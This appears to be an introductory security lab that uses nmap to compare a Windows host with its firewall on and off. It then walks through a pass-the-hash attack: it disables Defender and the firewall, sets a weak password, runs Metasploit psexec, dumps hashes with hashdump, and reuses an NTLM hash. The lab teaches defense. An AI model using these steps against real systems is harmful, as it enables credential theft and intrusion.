![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


# Host Firewalls and Nmap

In this lab we will be scanning your **Windows** system from your **Linux** terminal with the firewall both on and off. 

The goal is to show you how a system is very different to the network with a firewall enabled. 

Remember, treat your internal network as hostile, because it is.

Let's get started by opening a command prompt terminal. You can do this by clicking the icon in the taskbar.

![](attachments/openingcommandprompt%20-%20Copy.png)

From the command prompt we need to get the IP address of **your** Windows system:

<pre>ipconfig</pre>

![](attachments/nmap_ipconfig.png)

Please note your IP for **your** system. Mine is **"10.10.1.209"**. 

**Yours will be different.**

Let’s try and scan your Windows system from within a **Kali** terminal. Go ahead and open a **Kali** terminal up.

![](attachments/OpeningKaliInstance.png)

Alternatively, you can click on the **Kali** logo in the taskbar.

![](attachments/TaskbarKaliIcon.png)

In the **Kali** terminal, let’s become root:

<pre>sudo su -</pre>

We will scan your Windows system:

<pre>nmap 10.10.1.209</pre>

You can hit the spacebar to get status.

It should look like this:

![](attachments/nmap_nmap.png)

Please note the open ports. These are ports and services that an attacker could use to authenticate to your system or attack if an exploit is available. 

Go back to the **Windows** command prompt.  

![](attachments/openingcommandprompt%20-%20Copy.png)

Let’s enable the Windows firewall:

<pre>netsh advfirewall set allprofiles state on</pre>

![](attachments/nmap_advfirewallon.png)

Now, let’s rescan from the **Kali** terminal.

Rerun the scan: 

<pre>nmap 10.10.1.209</pre>

Please note, you can just hit the up arrow key to view previously run commands.  

You can hit the spacebar to see status.

It should look like this:

![](attachments/nmap_nmapscanwfirewall.png)

Now, using the same process as before, let’s disable the **Windows** firewall to go back to the base state:

<pre>netsh advfirewall set allprofiles state off</pre>

![](attachments/nmap_turnbackon.png)


Now, lets see why this is important with pass the hash.

First lets configure the Windows system

Let's disable AV.

PS C:\Users\Administrator> `Set-MpPreference -DisableRealtimeMonitoring $true`

Next, let's make sure that firewall is off.

PS C:\Users\Administrator> `netsh advfirewall set allprofiles state off`

Now, let's set an easy password.  

PS C:\Users\Administrator> `net user Administrator password1234`

PS C:\Users\Administrator> `ipconfig`


It should look like this:

<img width="641" alt="image" src="https://github.com/user-attachments/assets/10ffe094-f254-451e-95eb-d830b044e9a6">

Now, let's open a Kali terminal:

<img width="42" alt="image" src="https://github.com/user-attachments/assets/c64ee4a9-a642-4128-bb84-9cbe016cc5ba">

Become root:

`sudo su -`

Start Metasploit

`msfconsole -q`

<img width="770" alt="image" src="https://github.com/user-attachments/assets/d32ecb85-5873-478a-b270-fbaf33e11aec">

In another Kali terminal, get your IP address

`ifconfig`

<img width="661" alt="image" src="https://github.com/user-attachments/assets/44e622e5-34b6-4f0e-8547-769e891152e5">

msf6 > `use exploit/windows/smb/psexec`


msf6 exploit(windows/smb/psexec) > `set RHOST 10.10.70.106`

msf6 exploit(windows/smb/psexec) > `set LHOST 10.10.117.128`


msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`

msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`

It should look lie this:

<img width="1139" alt="image" src="https://github.com/user-attachments/assets/9eb2b530-b318-4636-a111-5d6cbe73a906">

Now dump the password hashes:

meterpreter > `hashdump`

<img width="1139" alt="image" src="https://github.com/user-attachments/assets/b3bbe145-51ab-4029-aefe-e036351af4fa">

meterpreter > exit -y


msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:30ee6993157208a29fb730af8bcc3dfe`


<img width="1143" alt="image" src="https://github.com/user-attachments/assets/14882bb7-6891-4898-8dea-bc8023fd5930">

msf6 exploit(windows/smb/psexec) > `exploit`

<img width="1096" alt="image" src="https://github.com/user-attachments/assets/a0025016-882b-409c-90e1-ade208a19f7e">

Kill it


meterpreter > `exit -y`



Now, back at the Windows Powershell, re-enable your firewall


PS C:\Users\Administrator> `netsh advfirewall set allprofiles state on`

Then re-run the attack!!

<img width="1142" alt="image" src="https://github.com/user-attachments/assets/0cf9fa38-e3e3-419c-a346-576c90f6074c">


















***
***Continuing on to the next Lab?***

[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)

***Finished with the Labs?***


Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)

---

